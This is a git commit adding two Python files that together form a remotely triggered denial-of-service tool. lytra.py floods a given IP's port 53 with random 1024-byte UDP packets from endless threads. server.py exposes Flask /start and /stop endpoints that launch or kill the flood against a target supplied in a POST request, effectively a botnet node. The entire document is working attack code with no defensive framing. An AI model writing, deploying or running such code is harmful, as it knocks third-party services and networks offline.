e4ac6f176441c02605aee1508841686392f8bdcd
Bob <jwstes@gmail.com>
2023-11-23 15:32:38 +0800

    wefwe

---
+++ lytra.py
@@ -0,0 +1,26 @@
+import socket
+from os import urandom as _urandom
+import random
+import threading
+import sys
+
+UDP_IP = sys.argv[1]
+THREADS = int(sys.argv[2])
+UDP_PORT = 53
+
+def udp():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            address = (UDP_IP, UDP_PORT)
+            sock.sendto(random._urandom(1024), address)
+            for i in range(3):
+                sock.sendto(random._urandom(1024), address)
+        except:
+            sock.close()
+            print("Error")
+
+if __name__ == "__main__":
+    for i in range(THREADS):
+        t = threading.Thread(target=udp)
+        t.start()
---
+++ server.py
@@ -0,0 +1,46 @@
+from flask import Flask, jsonify, request
+import subprocess
+import psutil
+
+app = Flask(__name__)
+
+python_process = None
+myID = None
+
+@app.route('/start', methods=['POST'])
+def start_script():
+    global python_process
+    global myID
+    if python_process is not None and python_process.poll() is None:
+        return jsonify(error='Python script is already running'), 400
+
+    try:
+        data = request.get_json()
+        python_process = subprocess.Popen(['python3', 'lytra.py', f'{data["trg"]}', '1'])
+        myID = data['id']
+
+        return jsonify(message=f'Lyta {data["id"]} Started!')
+    except Exception as e:
+        return jsonify(error=str(e)), 500
+
+@app.route('/stop', methods=['POST'])
+def stop_script():
+    global python_process
+    global myID
+
+    if python_process is None or python_process.poll() is not None:
+        return jsonify(error='No running Python script to stop'), 400
+
+    try:
+        process = psutil.Process(python_process.pid)
+        for child in process.children(recursive=True):
+            child.terminate()
+        python_process.terminate()
+        python_process.wait()
+        python_process = None
+        return jsonify(message=f'Lytra {myID} Stopped')
+    except Exception as e:
+        return jsonify(error=str(e)), 500
+
+if __name__ == '__main__':
+    app.run(debug=True)
